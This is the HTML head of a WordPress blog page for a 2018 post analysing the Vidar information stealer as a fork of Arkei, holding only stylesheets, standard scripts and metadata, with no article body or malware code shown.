<!doctype html>
<html lang=en class="no-js">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Let&#8217;s dig into Vidar &#8211; An Arkei Copycat/Forked Stealer (In-depth analysis) &#8211; Fumik0_&#039;s box</title>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//secure.gravatar.com' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//fonts-api.wp.com' />
<link rel='dns-prefetch' href='//widgets.wp.com' />
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//0.gravatar.com' />
<link rel='dns-prefetch' href='//1.gravatar.com' />
<link rel='dns-prefetch' href='//2.gravatar.com' />
<link rel='dns-prefetch' href='//jetpack.wordpress.com' />
<link rel='dns-prefetch' href='//public-api.wordpress.com' />
<link rel='preconnect' href='//i0.wp.com' />
<link rel='preconnect' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Feed" href="https://fumik0.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Comments Feed" href="https://fumik0.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Let&#8217;s dig into Vidar &#8211; An Arkei Copycat/Forked Stealer (In-depth analysis) Comments Feed" href="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/fumik0.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.7.1/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<style id='wp-block-library-inline-css' type='text/css'>
.has-text-align-justify{text-align:justify;}
</style>
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-family--albert-sans: 'Albert Sans', sans-serif;--wp--preset--font-family--alegreya: Alegreya, serif;--wp--preset--font-family--arvo: Arvo, serif;--wp--preset--font-family--bodoni-moda: 'Bodoni Moda', serif;--wp--preset--font-family--bricolage-grotesque: 'Bricolage Grotesque', sans-serif;--wp--preset--font-family--cabin: Cabin, sans-serif;--wp--preset--font-family--chivo: Chivo, sans-serif;--wp--preset--font-family--commissioner: Commissioner, sans-serif;--wp--preset--font-family--cormorant: Cormorant, serif;--wp--preset--font-family--courier-prime: 'Courier Prime', monospace;--wp--preset--font-family--crimson-pro: 'Crimson Pro', serif;--wp--preset--font-family--dm-mono: 'DM Mono', monospace;--wp--preset--font-family--dm-sans: 'DM Sans', sans-serif;--wp--preset--font-family--dm-serif-display: 'DM Serif Display', serif;--wp--preset--font-family--domine: Domine, serif;--wp--preset--font-family--eb-garamond: 'EB Garamond', serif;--wp--preset--font-family--epilogue: Epilogue, sans-serif;--wp--preset--font-family--fahkwang: Fahkwang, sans-serif;--wp--preset--font-family--figtree: Figtree, sans-serif;--wp--preset--font-family--fira-sans: 'Fira Sans', sans-serif;--wp--preset--font-family--fjalla-one: 'Fjalla One', sans-serif;--wp--preset--font-family--fraunces: Fraunces, serif;--wp--preset--font-family--gabarito: Gabarito, system-ui;--wp--preset--font-family--ibm-plex-mono: 'IBM Plex Mono', monospace;--wp--preset--font-family--ibm-plex-sans: 'IBM Plex Sans', sans-serif;--wp--preset--font-family--ibarra-real-nova: 'Ibarra Real Nova', serif;--wp--preset--font-family--instrument-serif: 'Instrument Serif', serif;--wp--preset--font-family--inter: Inter, sans-serif;--wp--preset--font-family--josefin-sans: 'Josefin Sans', sans-serif;--wp--preset--font-family--jost: Jost, sans-serif;--wp--preset--font-family--libre-baskerville: 'Libre Baskerville', serif;--wp--preset--font-family--libre-franklin: 'Libre Franklin', sans-serif;--wp--preset--font-family--literata: Literata, serif;--wp--preset--font-family--lora: Lora, serif;--wp--preset--font-family--merriweather: Merriweather, serif;--wp--preset--font-family--montserrat: Montserrat, sans-serif;--wp--preset--font-family--newsreader: Newsreader, serif;--wp--preset--font-family--noto-sans-mono: 'Noto Sans Mono', sans-serif;--wp--preset--font-family--nunito: Nunito, sans-serif;--wp--preset--font-family--open-sans: 'Open Sans', sans-serif;--wp--preset--font-family--overpass: Overpass, sans-serif;--wp--preset--font-family--pt-serif: 'PT Serif', serif;--wp--preset--font-family--petrona: Petrona, serif;--wp--preset--font-family--piazzolla: Piazzolla, serif;--wp--preset--font-family--playfair-display: 'Playfair Display', serif;--wp--preset--font-family--plus-jakarta-sans: 'Plus Jakarta Sans', sans-serif;--wp--preset--font-family--poppins: Poppins, sans-serif;--wp--preset--font-family--raleway: Raleway, sans-serif;--wp--preset--font-family--roboto: Roboto, sans-serif;--wp--preset--font-family--roboto-slab: 'Roboto Slab', serif;--wp--preset--font-family--rubik: Rubik, sans-serif;--wp--preset--font-family--rufina: Rufina, serif;--wp--preset--font-family--sora: Sora, sans-serif;--wp--preset--font-family--source-sans-3: 'Source Sans 3', sans-serif;--wp--preset--font-family--source-serif-4: 'Source Serif 4', serif;--wp--preset--font-family--space-mono: 'Space Mono', monospace;--wp--preset--font-family--syne: Syne, sans-serif;--wp--preset--font-family--texturina: Texturina, serif;--wp--preset--font-family--urbanist: Urbanist, sans-serif;--wp--preset--font-family--work-sans: 'Work Sans', sans-serif;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-albert-sans-font-family{font-family: var(--wp--preset--font-family--albert-sans) !important;}.has-alegreya-font-family{font-family: var(--wp--preset--font-family--alegreya) !important;}.has-arvo-font-family{font-family: var(--wp--preset--font-family--arvo) !important;}.has-bodoni-moda-font-family{font-family: var(--wp--preset--font-family--bodoni-moda) !important;}.has-bricolage-grotesque-font-family{font-family: var(--wp--preset--font-family--bricolage-grotesque) !important;}.has-cabin-font-family{font-family: var(--wp--preset--font-family--cabin) !important;}.has-chivo-font-family{font-family: var(--wp--preset--font-family--chivo) !important;}.has-commissioner-font-family{font-family: var(--wp--preset--font-family--commissioner) !important;}.has-cormorant-font-family{font-family: var(--wp--preset--font-family--cormorant) !important;}.has-courier-prime-font-family{font-family: var(--wp--preset--font-family--courier-prime) !important;}.has-crimson-pro-font-family{font-family: var(--wp--preset--font-family--crimson-pro) !important;}.has-dm-mono-font-family{font-family: var(--wp--preset--font-family--dm-mono) !important;}.has-dm-sans-font-family{font-family: var(--wp--preset--font-family--dm-sans) !important;}.has-dm-serif-display-font-family{font-family: var(--wp--preset--font-family--dm-serif-display) !important;}.has-domine-font-family{font-family: var(--wp--preset--font-family--domine) !important;}.has-eb-garamond-font-family{font-family: var(--wp--preset--font-family--eb-garamond) !important;}.has-epilogue-font-family{font-family: var(--wp--preset--font-family--epilogue) !important;}.has-fahkwang-font-family{font-family: var(--wp--preset--font-family--fahkwang) !important;}.has-figtree-font-family{font-family: var(--wp--preset--font-family--figtree) !important;}.has-fira-sans-font-family{font-family: var(--wp--preset--font-family--fira-sans) !important;}.has-fjalla-one-font-family{font-family: var(--wp--preset--font-family--fjalla-one) !important;}.has-fraunces-font-family{font-family: var(--wp--preset--font-family--fraunces) !important;}.has-gabarito-font-family{font-family: var(--wp--preset--font-family--gabarito) !important;}.has-ibm-plex-mono-font-family{font-family: var(--wp--preset--font-family--ibm-plex-mono) !important;}.has-ibm-plex-sans-font-family{font-family: var(--wp--preset--font-family--ibm-plex-sans) !important;}.has-ibarra-real-nova-font-family{font-family: var(--wp--preset--font-family--ibarra-real-nova) !important;}.has-instrument-serif-font-family{font-family: var(--wp--preset--font-family--instrument-serif) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-josefin-sans-font-family{font-family: var(--wp--preset--font-family--josefin-sans) !important;}.has-jost-font-family{font-family: var(--wp--preset--font-family--jost) !important;}.has-libre-baskerville-font-family{font-family: var(--wp--preset--font-family--libre-baskerville) !important;}.has-libre-franklin-font-family{font-family: var(--wp--preset--font-family--libre-franklin) !important;}.has-literata-font-family{font-family: var(--wp--preset--font-family--literata) !important;}.has-lora-font-family{font-family: var(--wp--preset--font-family--lora) !important;}.has-merriweather-font-family{font-family: var(--wp--preset--font-family--merriweather) !important;}.has-montserrat-font-family{font-family: var(--wp--preset--font-family--montserrat) !important;}.has-newsreader-font-family{font-family: var(--wp--preset--font-family--newsreader) !important;}.has-noto-sans-mono-font-family{font-family: var(--wp--preset--font-family--noto-sans-mono) !important;}.has-nunito-font-family{font-family: var(--wp--preset--font-family--nunito) !important;}.has-open-sans-font-family{font-family: var(--wp--preset--font-family--open-sans) !important;}.has-overpass-font-family{font-family: var(--wp--preset--font-family--overpass) !important;}.has-pt-serif-font-family{font-family: var(--wp--preset--font-family--pt-serif) !important;}.has-petrona-font-family{font-family: var(--wp--preset--font-family--petrona) !important;}.has-piazzolla-font-family{font-family: var(--wp--preset--font-family--piazzolla) !important;}.has-playfair-display-font-family{font-family: var(--wp--preset--font-family--playfair-display) !important;}.has-plus-jakarta-sans-font-family{font-family: var(--wp--preset--font-family--plus-jakarta-sans) !important;}.has-poppins-font-family{font-family: var(--wp--preset--font-family--poppins) !important;}.has-raleway-font-family{font-family: var(--wp--preset--font-family--raleway) !important;}.has-roboto-font-family{font-family: var(--wp--preset--font-family--roboto) !important;}.has-roboto-slab-font-family{font-family: var(--wp--preset--font-family--roboto-slab) !important;}.has-rubik-font-family{font-family: var(--wp--preset--font-family--rubik) !important;}.has-rufina-font-family{font-family: var(--wp--preset--font-family--rufina) !important;}.has-sora-font-family{font-family: var(--wp--preset--font-family--sora) !important;}.has-source-sans-3-font-family{font-family: var(--wp--preset--font-family--source-sans-3) !important;}.has-source-serif-4-font-family{font-family: var(--wp--preset--font-family--source-serif-4) !important;}.has-space-mono-font-family{font-family: var(--wp--preset--font-family--space-mono) !important;}.has-syne-font-family{font-family: var(--wp--preset--font-family--syne) !important;}.has-texturina-font-family{font-family: var(--wp--preset--font-family--texturina) !important;}.has-urbanist-font-family{font-family: var(--wp--preset--font-family--urbanist) !important;}.has-work-sans-font-family{font-family: var(--wp--preset--font-family--work-sans) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='bootstrap-css' href='https://fumik0.com/wp-content/themes/mynote/assets/css/bootstrap.min.css?ver=4.1.0' type='text/css' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://fumik0.com/wp-content/themes/mynote/assets/css/fontawesome-all.min.css?ver=5.1.0' type='text/css' media='all' />
<link rel='stylesheet' id='mynote-font-roboto-css' href='https://fonts-api.wp.com/css?family=Roboto%3A300%2C400&#038;ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='mynote-css' href='https://fumik0.com/wp-content/themes/mynote/style.css?ver=1.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_likes-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/likes/style.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='subscription-modal-css-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/comments/subscription-modal-on-comment/subscription-modal.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='tablepress-default-css' href='https://fumik0.com/wp-content/plugins/tablepress/css/build/default.css?ver=2.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='hcb-style-css' href='https://fumik0.com/wp-content/plugins/highlighting-code-block/build/css/hcb_style.css?ver=1.2.9' type='text/css' media='all' />
<style id='hcb-style-inline-css' type='text/css'>
.hcb_wrap pre.prism{font-size: 15px}@media screen and (max-width: 599px){.hcb_wrap pre.prism{font-size: 15px}}.hcb_wrap pre:not([data-file]):not([data-show-lang])::before{ content: none;}.hcb_wrap pre{-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;}.hcb_wrap pre{font-family:Menlo, Consolas, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;}
</style>
<link rel='stylesheet' id='hcb-coloring-css' href='https://fumik0.com/wp-content/plugins/highlighting-code-block/build/css/coloring_dark.css?ver=1.2.9' type='text/css' media='all' />
<style id='jetpack-global-styles-frontend-style-inline-css' type='text/css'>
:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
</style>
<link rel='stylesheet' id='sharedaddy-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/sharedaddy/sharing.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://fumik0.com/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=14.2-a.3' type='text/css' media='all' />
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/themes/mynote/assets/js/bootstrap.bundle.min.js?ver=4.1.0" id="bootstrap-js"></script>
<script type="text/javascript" id="jetpack-mu-wpcom-settings-js-before">
/* <![CDATA[ */
var JETPACK_MU_WPCOM_SETTINGS = {"assetsUrl":"https:\/\/fumik0.com\/wp-content\/mu-plugins\/wpcomsh\/vendor\/automattic\/jetpack-mu-wpcom\/src\/build\/"};
/* ]]> */
</script>
<link rel="https://api.w.org/" href="https://fumik0.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://fumik0.com/wp-json/wp/v2/posts/436" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://fumik0.com/xmlrpc.php?rsd" />

<link rel="canonical" href="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/" />
<link rel='shortlink' href='https://wp.me/p9vZjq-72' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://fumik0.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffumik0.com%2F2018%2F12%2F24%2Flets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://fumik0.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffumik0.com%2F2018%2F12%2F24%2Flets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis%2F&#038;format=xml" />
	<style>img#wpstats{display:none}</style>
		<style id="mynote-customizer">
@media (max-width: 768px) {
.footer-columns { text-align: center !important; }
.footer-columns .footer-column-left { text-align: center !important; }
}
.scroll-area { display: block !important; }
body.menu-is-collapsed .header { background: rgba(20, 25, 29, 1) !important; }

</style><meta name="description" content="Sometimes when you are reading tons and tons of log of malware analysis, you are not expecting that some little changes could be in fact impactful. I paid the price when I was analyzing a supposed Arkei malware. my Yara rule at that time was supposed to trigger this malware, but after some reversing, I&hellip;" />
<link rel="amphtml" href="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Let&#8217;s dig into Vidar &#8211; An Arkei Copycat/Forked Stealer (In-depth analysis)" />
<meta property="og:url" content="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/" />
<meta property="og:description" content="Sometimes when you are reading tons and tons of log of malware analysis, you are not expecting that some little changes could be in fact impactful. I paid the price when I was analyzing a supposed …" />
<meta property="article:published_time" content="2018-12-24T09:32:01+00:00" />
<meta property="article:modified_time" content="2019-03-19T14:03:23+00:00" />
